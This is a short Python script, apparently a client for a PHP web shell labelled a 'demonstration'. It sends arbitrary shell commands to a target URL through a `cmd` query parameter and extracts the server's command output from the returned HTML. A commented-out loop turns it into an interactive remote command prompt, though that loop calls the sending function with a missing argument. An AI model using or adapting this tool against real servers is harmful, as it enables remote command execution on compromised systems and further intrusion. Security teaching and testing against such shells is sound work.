import requests
from bs4 import BeautifulSoup
import os
from dotenv import load_dotenv

load_dotenv()

def start_payload(url, payload):
    url = f"{url}?cmd={payload}"
    data = requests.get(url)
    html_data = data.text
    result = beautify(html_data)
    return result

def beautify(result):
    soup = BeautifulSoup(result, "html.parser")
    text = soup.find("pre").get_text(strip=True)
    return text


# print("Hey welcome to php web shell demonstration.\nTo stop just enter stop")
# while True:  
#     payload = input("\nEnter the payload: ")
#     if payload == "stop":
#         break
#     else:
#         print("The result is")
#         print(start_payload(payload))
